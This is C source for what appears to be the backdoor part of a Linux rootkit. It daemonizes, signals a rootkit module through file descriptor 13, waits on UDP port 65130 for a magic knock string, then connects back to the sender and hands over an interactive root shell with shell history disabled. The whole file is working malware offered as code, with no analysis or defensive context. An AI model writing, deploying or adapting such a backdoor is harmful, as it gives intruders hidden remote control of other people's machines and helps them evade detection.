#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>

#include "rootkit_conf.h"

int main(){
int s,i,fd,a=16;
struct sockaddr_in k;
struct sockaddr_in cl;
char buf[10];
char *argz[] = {"sh","-i",0};
char *envp[] = {"TERM=linux","HISTFILE=/dev/null","PS1=# ","PS2=> ",0};

daemon(0,0);
write(13,GOTROOT,1);
write(13,CHECKME,1);

if ((s = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP)) < 0)
  exit(0xfe6a);

memset(&k,0,16);
memset(&cl,0,16);
k.sin_family = AF_INET;
k.sin_port = htons(65130);
k.sin_addr.s_addr = 0;

if (bind(s,(struct sockaddr *) &k,16) < 0)
  exit(0xfe6a);

  while(1){

   memset(&buf,0,10);  
   i = recvfrom(s,buf,10,0,(struct sockaddr *) &cl, &a);
   
   if ((i > 0) && (strncmp(buf,R_LOGIN,10) == 0)){
      close(s);
      fd = vfork();
      if (fd == 0){
      
        write(13,GOTROOT,1);
	write(13,CHECKME,1);
	
        cl.sin_port = htons(65130);
        fd = socket(AF_INET,SOCK_STREAM,0);
        sleep(3);
        if (connect(fd,(struct sockaddr *) &cl, 16) < 0){ close(fd); exit(0xfe6a); }

        dup2(fd,2); dup2(fd,1); dup2(fd,0);
        write(fd," Welc0me, master! \n",18);

        execve("/bin/sh",argz,envp);
	exit(0xfe6a);
      } else fd = 0;
   } 
    sleep(10);
  }

exit(0xfe6a);
}
